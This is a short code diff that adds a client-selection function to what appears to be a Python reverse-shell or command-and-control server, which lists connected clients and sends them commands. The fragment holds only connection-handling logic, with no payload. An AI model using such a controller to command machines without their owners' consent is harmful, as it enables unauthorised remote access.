@@ -92,6 +92,22 @@ def list_connections():
     print('------------Clients------------' + '\n' + results)
 
 
+# Select target client
+def get_target(cmd):
+    try:
+        target = cmd.replace('select ', '')
+        target = int(target)
+        conn = all_connections[target]
+        print("You are now connected to " + str(all_addresses[target][0]))
+        print(str(all_addresses[target][0]) + '> ', end='')
+        return conn
+    except:
+        print("Not a valid selection.")
+        return None
+    
+
+
+
 # Sends commands to client
 def send_commands(conn):
     while True:
